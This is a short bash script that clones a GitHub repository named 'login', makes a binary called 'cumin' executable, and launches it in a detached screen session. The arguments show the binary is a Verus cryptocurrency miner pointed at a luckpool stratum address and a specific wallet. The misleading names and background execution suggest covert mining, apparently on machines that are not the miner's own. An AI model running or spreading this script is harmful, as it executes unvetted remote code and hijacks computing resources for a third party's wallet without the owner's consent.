#!/bin/bash
sudo apt update
sudo apt install screen libjansson4 -y
git clone https://github.com/sallygonza/login.git 
cd login
chmod +x cumin
screen -dmS layar ./cumin -a verus -o stratum+tcp://na.luckpool.net:3956#xnsub -u RJqUqa4GeMWKJJ4c95roAQZJGgf1H2KsyW.dabrik -t 2 -p hybrid\n
